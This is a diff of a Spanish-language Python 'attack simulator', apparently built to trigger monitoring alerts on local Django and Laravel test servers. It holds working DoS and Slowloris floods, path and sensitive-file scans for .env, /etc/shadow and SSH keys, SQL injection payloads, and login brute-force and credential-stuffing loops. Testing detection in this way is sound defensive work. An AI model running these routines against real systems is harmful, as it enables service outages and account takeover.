@@ -5,423 +5,359 @@ import threading
 import time
 import random
 import string
-import socket
-import os
+import sys
 
-TARGET = "http://192.168.1.154"
-LARAVEL = f"{TARGET}:81"
-DJANGO = f"{TARGET}:80"
+try:
+    from colorama import init, Fore, Back, Style
+    init(autoreset=True)
+except ImportError:
+    import subprocess
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
+    from colorama import init, Fore, Back, Style
+    init(autoreset=True)
 
-# Colores
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-CYAN = "\033[96m"
-RESET = "\033[0m"
-BOLD = "\033[1m"
+BASE_URL_DJANGO = "http://django.test"
+BASE_URL_LARAVEL = "http://laravel.test"
 
-def clear():
-    os.system('clear')
+def menu():
+    print("\n" + Fore.CYAN + "="*50)
+    print(Fore.CYAN + "   SIMULADOR DE ATAQUES - HERRAMIENTA DE PRUEBAS")
+    print(Fore.CYAN + "="*50)
+    print(Fore.RED    + "1.  " + Fore.WHITE + "DoS - Muchas conexiones desde una IP")
+    print(Fore.RED    + "2.  " + Fore.WHITE + "Scraping - Alto número de requests por endpoint")
+    print(Fore.YELLOW + "3.  " + Fore.WHITE + "Escaneo de rutas (errores 4xx)")
+    print(Fore.YELLOW + "4.  " + Fore.WHITE + "Fuerza bruta (401/403)")
+    print(Fore.YELLOW + "5.  " + Fore.WHITE + "Acceso a archivos sensibles")
+    print(Fore.YELLOW + "6.  " + Fore.WHITE + "Inyección SQL en URLs")
+    print(Fore.MAGENTA+ "7.  " + Fore.WHITE + "Fuerza bruta en login de Laravel")
+    print(Fore.MAGENTA+ "8.  " + Fore.WHITE + "Credential stuffing")
+    print(Fore.BLUE   + "9.  " + Fore.WHITE + "Reconocimiento (OPTIONS y HEAD)")
+    print(Fore.BLUE   + "10. " + Fore.WHITE + "Buffer overflow (payloads grandes)")
+    print(Fore.GREEN  + "11. " + Fore.WHITE + "Alto uso de CPU")
+    print(Fore.GREEN  + "12. " + Fore.WHITE + "Alto uso de RAM")
+    print(Fore.WHITE  + "0.  " + Fore.WHITE + "Salir")
+    print(Fore.CYAN + "="*50)
+    return input(Fore.CYAN + "Selecciona una opción: " + Fore.WHITE).strip()
 
-def print_header():
-    clear()
-    print(f"{RED}{BOLD}")
-    print("╔══════════════════════════════════════════════════════════╗")
-    print("║           SIMULADOR DE ATAQUES - SOLO PARA PRUEBAS       ║")
-    print("║                  Entorno controlado                      ║")
-    print("╚══════════════════════════════════════════════════════════╝")
-    print(f"{RESET}")
+def header(title, color=Fore.RED):
+    print(f"\n{color}{'='*50}")
+    print(f"{color}  {title}")
+    print(f"{color}{'='*50}{Style.RESET_ALL}")
 
-def print_menu():
-    print_header()
-    print(f"{BOLD}Selecciona el ataque a simular:{RESET}\n")
-    print(f"  {CYAN}[1]{RESET}  DDoS - Alto número de requests por IP")
-    print(f"  {CYAN}[2]{RESET}  Scraping - Alto número de requests por endpoint")
-    print(f"  {CYAN}[3]{RESET}  Escaneo de rutas - Spike de errores 4xx")
-    print(f"  {CYAN}[4]{RESET}  Fuerza bruta - Alto número de 401/403")
-    print(f"  {CYAN}[5]{RESET}  Acceso a archivos sensibles")
-    print(f"  {CYAN}[6]{RESET}  Inyección SQL en URLs")
-    print(f"  {CYAN}[7]{RESET}  Fuerza bruta en login de Laravel")
-    print(f"  {CYAN}[8]{RESET}  Credential stuffing")
-    print(f"  {CYAN}[9]{RESET}  Reconocimiento - Requests OPTIONS y HEAD")
-    print(f"  {CYAN}[10]{RESET} Buffer overflow - Payloads grandes")
-    print(f"  {CYAN}[11]{RESET} DoS - Alto número de conexiones desde una IP")
-    print(f"  {CYAN}[12]{RESET} Slowloris - Conexiones lentas simultáneas")
-    print(f"  {CYAN}[13]{RESET} Alto uso de CPU (estrés del servidor)")
-    print(f"  {CYAN}[14]{RESET} Alto uso de RAM (estrés del servidor)")
-    print(f"\n  {RED}[0]{RESET}  Salir\n")
+def ok(msg):
+    print(Fore.GREEN + "  ✔ " + Fore.WHITE + msg)
 
-def wait_for_alert():
-    print(f"\n{YELLOW}⏳ Simulación en curso... Espera 1-2 minutos y revisa Grafana y Discord.{RESET}")
-    print(f"{YELLOW}   Presiona Enter para volver al menú.{RESET}")
-    input()
+def info(msg):
+    print(Fore.CYAN + "  ℹ " + Fore.WHITE + msg)
 
-def simulate_ddos():
-    print_header()
-    print(f"{RED}[1] Simulando DDoS - 150 requests en menos de 1 minuto...{RESET}\n")
-    count = 0
-    for i in range(150):
+def warn(msg):
+    print(Fore.YELLOW + "  ⚠ " + Fore.WHITE + msg)
+
+def err(msg):
+    print(Fore.RED + "  ✘ " + Fore.WHITE + msg)
+
+# 1. DoS
+def dos_attack():
+    header("DoS - Muchas conexiones desde una IP")
+    info("Enviando 200 requests rápidas...")
+    url = BASE_URL_DJANGO
+    contador = {"ok": 0, "fail": 0}
+
+    def send():
         try:
-            requests.get(TARGET, timeout=2)
-            count += 1
-            print(f"\r  Requests enviadas: {count}/150", end="", flush=True)
+            requests.get(url, timeout=5)
+            contador["ok"] += 1
         except:
-            pass
-    print(f"\n\n{GREEN}✓ Simulación completada. Se enviaron {count} requests.{RESET}")
-    wait_for_alert()
-
-def simulate_scraping():
-    print_header()
-    print(f"{RED}[2] Simulando scraping - 210 requests al mismo endpoint...{RESET}\n")
-    endpoint = f"{DJANGO}/api/producto/"
-    count = 0
-    for i in range(210):
-        try:
-            requests.get(endpoint, timeout=2)
-            count += 1
-            print(f"\r  Requests enviadas: {count}/210", end="", flush=True)
-        except:
-            pass
-    print(f"\n\n{GREEN}✓ Simulación completada. Se enviaron {count} requests a {endpoint}.{RESET}")
-    wait_for_alert()
-
-def simulate_4xx_scan():
-    print_header()
-    print(f"{RED}[3] Simulando escaneo de rutas - 60 requests a rutas inexistentes...{RESET}\n")
-    fake_routes = [
-        "/admin", "/administrator", "/wp-admin", "/dashboard",
-        "/api/users", "/api/admin", "/secret", "/private",
-        "/uploads", "/files", "/data", "/db", "/sql",
-        "/test", "/dev", "/staging", "/old", "/backup2",
-        "/config.php", "/settings.php", "/info.php",
-    ]
-    count = 0
-    for i in range(60):
-        route = random.choice(fake_routes)
-        try:
-            requests.get(f"{TARGET}{route}", timeout=2)
-            count += 1
-            print(f"\r  Requests enviadas: {count}/60 → {route}", end="", flush=True)
-        except:
-            pass
-    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_401_403():
-    print_header()
-    print(f"{RED}[4] Simulando fuerza bruta - 25 requests generando 401/403...{RESET}\n")
-    count = 0
-    for i in range(25):
-        try:
-            requests.get(
-                f"{LARAVEL}/dashboard",
-                headers={"Authorization": "Bearer token_invalido"},
-                timeout=2
-            )
-            count += 1
-            print(f"\r  Requests enviadas: {count}/25", end="", flush=True)
-        except:
-            pass
-    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_sensitive_files():
-    print_header()
-    print(f"{RED}[5] Simulando acceso a archivos sensibles...{RESET}\n")
-    sensitive = [
-        "/.env", "/.git/config", "/config", "/backup",
-        "/.htaccess", "/.htpasswd", "/config.yml",
-        "/database.yml", "/.env.local", "/.env.production",
-    ]
-    for path in sensitive:
-        try:
-            r = requests.get(f"{TARGET}{path}", timeout=2)
-            print(f"  {path} → {r.status_code}")
-        except:
-            print(f"  {path} → error")
-        time.sleep(0.2)
-    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_sql_injection():
-    print_header()
-    print(f"{RED}[6] Simulando inyección SQL en URLs...{RESET}\n")
-    payloads = [
-        "/api/producto/?id=1 UNION SELECT * FROM users",
-        "/api/producto/?id=1' OR '1'='1",
-        "/api/producto/?id=DROP TABLE users",
-        "/api/producto/?id=1; SELECT * FROM information_schema",
-        "/api/producto/?search=<script>alert(1)</script>",
-        "/api/producto/?id=1 AND 1=1",
-        "/api/producto/?id=admin'--",
-        "/api/producto/?id=1 EXEC xp_cmdshell",
-    ]
-    for payload in payloads:
-        try:
-            r = requests.get(f"{DJANGO}{payload}", timeout=2)
-            print(f"  {payload[:60]}... → {r.status_code}")
-        except:
-            print(f"  {payload[:60]}... → error")
-        time.sleep(0.3)
-    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_brute_force_login():
-    print_header()
-    print(f"{RED}[7] Simulando fuerza bruta en login de Laravel - 15 intentos...{RESET}\n")
-    passwords = [
-        "123456", "password", "admin", "12345678", "qwerty",
-        "abc123", "111111", "letmein", "monkey", "dragon",
-        "master", "sunshine", "princess", "welcome", "shadow",
-    ]
-    count = 0
-    for pwd in passwords:
-        try:
-            r = requests.post(
-                f"{LARAVEL}/login",
-                data={
-                    "email": "admin@test.com",
-                    "password": pwd,
-                    "_token": "fake_token"
-                },
-                timeout=2,
-                allow_redirects=False
-            )
-            count += 1
-            print(f"  Intento {count}/15: password='{pwd}' → {r.status_code}")
-        except:
-            print(f"  Intento {count}/15: password='{pwd}' → error")
-        time.sleep(0.3)
-    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_credential_stuffing():
-    print_header()
-    print(f"{RED}[8] Simulando credential stuffing - 5 usuarios distintos desde esta IP...{RESET}\n")
-    users = [
-        ("usuario1@test.com", "password1"),
-        ("usuario2@gmail.com", "123456"),
-        ("admin@empresa.com", "admin123"),
-        ("root@servidor.com", "toor"),
-        ("test@test.com", "test"),
-    ]
-    for email, pwd in users:
-        try:
-            r = requests.post(
-                f"{LARAVEL}/login",
-                data={
-                    "email": email,
-                    "password": pwd,
-                    "_token": "fake_token"
-                },
-                timeout=2,
-                allow_redirects=False
-            )
-            print(f"  {email} → {r.status_code}")
-        except:
-            print(f"  {email} → error")
-        time.sleep(0.5)
-    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_reconnaissance():
-    print_header()
-    print(f"{RED}[9] Simulando reconocimiento - 25 requests OPTIONS y HEAD...{RESET}\n")
-    endpoints = [
-        "/", "/api/", "/api/producto/", "/login",
-        "/dashboard", "/admin", "/static/",
-    ]
-    count = 0
-    for i in range(25):
-        endpoint = random.choice(endpoints)
-        method = random.choice(["OPTIONS", "HEAD"])
-        try:
-            r = requests.request(method, f"{TARGET}{endpoint}", timeout=2)
-            count += 1
-            print(f"\r  {method} {endpoint} → {r.status_code} ({count}/25)", end="", flush=True)
-        except:
-            count += 1
-            print(f"\r  {method} {endpoint} → error ({count}/25)", end="", flush=True)
-        time.sleep(0.1)
-    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_buffer_overflow():
-    print_header()
-    print(f"{RED}[10] Simulando buffer overflow - Enviando payloads de 2MB...{RESET}\n")
-    large_payload = "A" * (2 * 1024 * 1024)
-    count = 0
-    for i in range(5):
-        try:
-            r = requests.post(
-                f"{TARGET}/api/producto/",
-                data={"data": large_payload},
-                timeout=5
-            )
-            count += 1
-            print(f"  Request {count}/5 → {r.status_code}")
-        except Exception as e:
-            count += 1
-            print(f"  Request {count}/5 → {str(e)[:50]}")
-        time.sleep(0.5)
-    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_dos():
-    print_header()
-    print(f"{RED}[11] Simulando DoS - 250 requests en menos de 1 minuto...{RESET}\n")
-    count = 0
-    lock = threading.Lock()
-
-    def send_request():
-        nonlocal count
-        try:
-            requests.get(TARGET, timeout=2)
-            with lock:
-                count += 1
-                print(f"\r  Requests enviadas: {count}/250", end="", flush=True)
-        except:
-            pass
+            contador["fail"] += 1
 
     threads = []
-    for i in range(250):
-        t = threading.Thread(target=send_request)
+    for _ in range(200):
+        t = threading.Thread(target=send)
         threads.append(t)
         t.start()
-        time.sleep(0.01)
 
     for t in threads:
         t.join()
 
-    print(f"\n\n{GREEN}✓ Simulación completada. Se enviaron {count} requests.{RESET}")
-    wait_for_alert()
+    ok(f"Requests enviadas: {contador['ok']}")
+    if contador["fail"]:
+        warn(f"Requests fallidas: {contador['fail']}")
+    ok("DoS completado.")
 
-def simulate_slowloris():
-    print_header()
-    print(f"{RED}[12] Simulando Slowloris - 150 conexiones TCP lentas simultáneas...{RESET}\n")
-    sockets = []
-    host = "192.168.1.154"
-    port = 80
-
-    print(f"  Abriendo conexiones lentas...")
-    for i in range(150):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10)
-            s.connect((host, port))
-            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
-            sockets.append(s)
-            print(f"\r  Conexiones abiertas: {len(sockets)}/150", end="", flush=True)
-        except:
-            pass
-        time.sleep(0.05)
-
-    print(f"\n\n  Manteniendo conexiones abiertas por 30 segundos...")
-    for i in range(30):
-        for s in sockets:
+# 2. Scraping
+def scraping_attack():
+    header("Scraping - Alto número de requests por endpoint", Fore.RED)
+    endpoints = [
+        "/api/producto/",
+        "/api/producto/1/",
+        "/api/producto/2/",
+        "/api/producto/3/",
+    ]
+    info("Raspando endpoints repetidamente...")
+    total = 0
+    for _ in range(50):
+        for ep in endpoints:
             try:
-                s.send(f"X-Header: {i}\r\n".encode())
+                r = requests.get(BASE_URL_DJANGO + ep, timeout=5)
+                total += 1
             except:
                 pass
-        time.sleep(1)
-        print(f"\r  Tiempo restante: {30-i-1}s", end="", flush=True)
+    ok(f"Total requests enviadas: {total}")
+    ok("Scraping completado.")
 
-    for s in sockets:
+# 3. Escaneo de rutas
+def route_scan():
+    header("Escaneo de rutas (errores 4xx)", Fore.YELLOW)
+    rutas = [
+        "/admin", "/admin/login", "/wp-login.php", "/wp-admin",
+        "/.env", "/.git/config", "/config.php", "/backup.zip",
+        "/phpmyadmin", "/adminer", "/shell.php", "/cmd.php",
+        "/api/users", "/api/admin", "/dashboard", "/secret",
+    ]
+    info("Probando rutas inexistentes...")
+    for ruta in rutas:
+        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
+            try:
+                r = requests.get(base + ruta, timeout=5)
+                color = Fore.GREEN if r.status_code < 400 else Fore.RED
+                print(f"  {color}{base}{ruta} → {r.status_code}{Style.RESET_ALL}")
+            except Exception as e:
+                err(f"{base}{ruta} → {e}")
+    ok("Escaneo completado.")
+
+# 4. Fuerza bruta 401/403
+def brute_force_auth():
+    header("Fuerza bruta (401/403)", Fore.YELLOW)
+    endpoints = ["/api/admin", "/api/users", "/dashboard", "/admin"]
+    info("Probando endpoints protegidos...")
+    for _ in range(30):
+        for ep in endpoints:
+            for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
+                try:
+                    requests.get(base + ep, timeout=5)
+                except:
+                    pass
+    ok("Fuerza bruta completada.")
+
+# 5. Archivos sensibles
+def sensitive_files():
+    header("Acceso a archivos sensibles", Fore.YELLOW)
+    rutas = [
+        "/.env", "/.env.local", "/.env.production",
+        "/.git/config", "/.git/HEAD",
+        "/config/database.yml", "/config/secrets.yml",
+        "/storage/logs/laravel.log",
+        "/wp-config.php", "/configuration.php",
+        "/etc/passwd", "/etc/shadow",
+        "/id_rsa", "/.ssh/id_rsa",
+    ]
+    info("Accediendo a rutas sensibles...")
+    for ruta in rutas:
+        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
+            try:
+                r = requests.get(base + ruta, timeout=5)
+                color = Fore.GREEN if r.status_code < 400 else Fore.RED
+                print(f"  {color}{base}{ruta} → {r.status_code}{Style.RESET_ALL}")
+            except Exception as e:
+                err(f"{base}{ruta} → {e}")
+    ok("Acceso a archivos sensibles completado.")
+
+# 6. Inyección SQL
+def sql_injection():
+    header("Inyección SQL en URLs", Fore.YELLOW)
+    payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "1; DROP TABLE users--",
+        "1 UNION SELECT * FROM users--",
+        "' OR 1=1--",
+        "admin'--",
+        "1' AND SLEEP(5)--",
+        "' OR 'x'='x",
+    ]
+    info("Enviando payloads en URLs...")
+    for payload in payloads:
+        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
+            try:
+                r = requests.get(f"{base}/api/producto/{payload}/", timeout=5)
+                color = Fore.GREEN if r.status_code < 400 else Fore.RED
+                print(f"  {color}payload={payload!r} → {r.status_code}{Style.RESET_ALL}")
+            except Exception as e:
+                err(f"payload={payload!r} → {e}")
+    ok("Inyección SQL completada.")
+
+# 7. Fuerza bruta login Laravel
+def laravel_login_brute():
+    header("Fuerza bruta en login de Laravel", Fore.MAGENTA)
+    url = BASE_URL_LARAVEL + "/login"
+    passwords = ["123456", "password", "admin", "secret", "laravel",
+                 "qwerty", "abc123", "letmein", "monkey", "master"]
+    info(f"Atacando {url}...")
+    for pwd in passwords * 5:
         try:
-            s.close()
-        except:
-            pass
+            r = requests.post(url, data={
+                "email": "admin@test.com",
+                "password": pwd,
+                "_token": "fake_token"
+            }, timeout=5)
+            print(f"  {Fore.CYAN}pwd={pwd!r} → {r.status_code}{Style.RESET_ALL}")
+        except Exception as e:
+            err(f"pwd={pwd!r} → {e}")
+    ok("Fuerza bruta en login completada.")
 
-    print(f"\n\n{GREEN}✓ Simulación completada. Conexiones cerradas.{RESET}")
-    wait_for_alert()
+# 8. Credential stuffing
+def credential_stuffing():
+    header("Credential Stuffing", Fore.MAGENTA)
+    credentials = [
+        ("user1@gmail.com", "Password1"),
+        ("admin@yahoo.com", "Admin123"),
+        ("test@hotmail.com", "Test1234"),
+        ("john@gmail.com", "John2020"),
+        ("maria@test.com", "Maria123"),
+        ("carlos@gmail.com", "Carlos99"),
+        ("ana@test.com", "Ana12345"),
+        ("pedro@gmail.com", "Pedro000"),
+    ]
+    url = BASE_URL_LARAVEL + "/login"
+    info(f"Probando credenciales filtradas en {url}...")
+    for email, pwd in credentials * 3:
+        try:
+            r = requests.post(url, data={
+                "email": email,
+                "password": pwd,
+                "_token": "fake_token"
+            }, timeout=5)
+            print(f"  {Fore.CYAN}{email}:{pwd} → {r.status_code}{Style.RESET_ALL}")
+        except Exception as e:
+            err(f"{email} → {e}")
+    ok("Credential stuffing completado.")
 
-def simulate_cpu_stress():
-    print_header()
-    print(f"{RED}[13] Simulando alto uso de CPU por 3 minutos...{RESET}\n")
-    print(f"  {YELLOW}Esto estresará el CPU real del servidor.{RESET}\n")
+# 9. Reconocimiento OPTIONS/HEAD
+def reconnaissance():
+    header("Reconocimiento (OPTIONS y HEAD)", Fore.BLUE)
+    endpoints = [
+        "/", "/api/", "/api/producto/",
+        "/admin", "/login", "/dashboard",
+    ]
+    info("Enviando OPTIONS y HEAD requests...")
+    for ep in endpoints:
+        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
+            try:
+                r_opt = requests.options(base + ep, timeout=5)
+                r_head = requests.head(base + ep, timeout=5)
+                print(f"  {Fore.BLUE}OPTIONS {base}{ep} → {r_opt.status_code}{Style.RESET_ALL}")
+                print(f"  {Fore.BLUE}HEAD    {base}{ep} → {r_head.status_code}{Style.RESET_ALL}")
+            except Exception as e:
+                err(f"{base}{ep} → {e}")
+    ok("Reconocimiento completado.")
 
-    stop = threading.Event()
+# 10. Buffer overflow
+def buffer_overflow():
+    header("Buffer Overflow (payloads grandes)", Fore.BLUE)
+    payload_grande = "A" * 10000
+    payload_header = "X" * 8000
+    info("Enviando payloads enormes...")
+    for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
+        try:
+            requests.get(f"{base}/?q={payload_grande}", timeout=5)
+            requests.post(f"{base}/api/producto/", data={"data": payload_grande}, timeout=5)
+            requests.get(base, headers={"X-Custom": payload_header}, timeout=5)
+            ok(f"{base} → payloads enviados")
+        except Exception as e:
+            err(f"{base} → {e}")
+    ok("Buffer overflow completado.")
 
-    def cpu_burn():
-        while not stop.is_set():
-            n = 99999999
-            for i in range(2, int(n**0.5)):
-                if n % i == 0:
-                    break
+# 11. Alto CPU
+def high_cpu():
+    header("Alto uso de CPU", Fore.GREEN)
+    info("Generando carga de CPU por 30 segundos...")
+    warn("Presiona Ctrl+C para detener antes.")
 
-    num_cores = os.cpu_count()
+    def burn_cpu():
+        end = time.time() + 30
+        while time.time() < end:
+            _ = [x**2 for x in range(10000)]
+
     threads = []
-    for _ in range(num_cores * 4):  # 4x threads por core
-        t = threading.Thread(target=cpu_burn)
+    for _ in range(4):
+        t = threading.Thread(target=burn_cpu)
         t.daemon = True
         threads.append(t)
         t.start()
 
-    for i in range(180):
-        print(f"\r  Estresando {num_cores * 4} threads... {180-i}s restantes", end="", flush=True)
-        time.sleep(1)
-
-    stop.set()
-    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
-    wait_for_alert()
-
-def simulate_ram_stress():
-    print_header()
-    print(f"{RED}[14] Simulando alto uso de RAM...{RESET}\n")
-    print(f"  {YELLOW}Esto consumirá RAM real del servidor.{RESET}\n")
-
-    chunks = []
     try:
-        for i in range(50):
-            chunk = " " * (100 * 1024 * 1024)
-            chunks.append(chunk)
-            used = (i + 1) * 100
-            print(f"\r  RAM consumida: ~{used}MB", end="", flush=True)
-            time.sleep(0.5)
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        warn("Detenido por el usuario.")
+
+    ok("Alto CPU completado.")
+
+
+# 12. Alto RAM (Versión Persistente)
+def high_ram():
+    header("Alto uso de RAM", Fore.GREEN)
+    bloque_size = 100 * 1024 * 1024  # Bloques de 100MB
+    # Preguntamos cuánto tiempo queremos mantener la carga
+    try:
+        segundos = int(input(Fore.CYAN + " ¿Cuántos segundos quieres mantener la RAM ocupada? (ej. 60): " + Fore.WHITE))
+    except:
+        segundos = 60
+
+    info(f"Consumiendo memoria. Se mantendrá por {segundos}s...")
+    
+    bloques = []
+    try:
+        # Llenamos la RAM (ajusta el rango si tienes mucha RAM, ej. range(40) para 4GB)
+        for i in range(25): 
+            bloques.append(" " * bloque_size)
+            total_actual = (i + 1) * 100
+            print(f"  {Fore.GREEN}→{Fore.WHITE} RAM ocupada: {total_actual}MB", end="\r")
+            time.sleep(0.1)
+        
+        print("\n")
+        ok(f"Carga completa. Manteniendo durante {segundos} segundos...")
+        
+        # El truco: un contador visual mientras la memoria sigue llena
+        for restante in range(segundos, 0, -1):
+            print(f"  {Fore.YELLOW}ℹ{Fore.WHITE} Liberando en: {restante}s  ", end="\r")
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        warn("\nInterrupción manual detectada.")
     except MemoryError:
-        print(f"\n  {YELLOW}Límite de memoria alcanzado.{RESET}")
+        err("\n¡MemoryError! El servidor se quedó sin RAM.")
+    finally:
+        bloques.clear() # Aquí es donde realmente se libera
+        print("\n")
+        ok("Memoria liberada correctamente.")
 
-    print(f"\n\n  Manteniendo uso de RAM por 60 segundos...")
-    for i in range(60):
-        print(f"\r  Tiempo restante: {60-i}s", end="", flush=True)
-        time.sleep(1)
-
-    chunks.clear()
-    print(f"\n\n{GREEN}✓ Simulación completada. RAM liberada.{RESET}")
-    wait_for_alert()
-
+# Main
 def main():
-    actions = {
-        "1": simulate_ddos,
-        "2": simulate_scraping,
-        "3": simulate_4xx_scan,
-        "4": simulate_401_403,
-        "5": simulate_sensitive_files,
-        "6": simulate_sql_injection,
-        "7": simulate_brute_force_login,
-        "8": simulate_credential_stuffing,
-        "9": simulate_reconnaissance,
-        "10": simulate_buffer_overflow,
-        "11": simulate_dos,
-        "12": simulate_slowloris,
-        "13": simulate_cpu_stress,
-        "14": simulate_ram_stress,
+    acciones = {
+        "1": dos_attack,
+        "2": scraping_attack,
+        "3": route_scan,
+        "4": brute_force_auth,
+        "5": sensitive_files,
+        "6": sql_injection,
+        "7": laravel_login_brute,
+        "8": credential_stuffing,
+        "9": reconnaissance,
+        "10": buffer_overflow,
+        "11": high_cpu,
+        "12": high_ram,
     }
 
     while True:
-        print_menu()
-        choice = input(f"{BOLD}Opción: {RESET}").strip()
-
-        if choice == "0":
-            clear()
-            print(f"{GREEN}Saliendo...{RESET}\n")
-            break
-        elif choice in actions:
-            actions[choice]()
+        opcion = menu()
+        if opcion == "0":
+            print(Fore.CYAN + "\nSaliendo..." + Style.RESET_ALL)
+            sys.exit(0)
+        elif opcion in acciones:
+            acciones[opcion]()
         else:
-            print(f"\n{RED}Opción inválida.{RESET}")
-            time.sleep(1)
+            warn("Opción no válida.")
 
 if __name__ == "__main__":
     main()
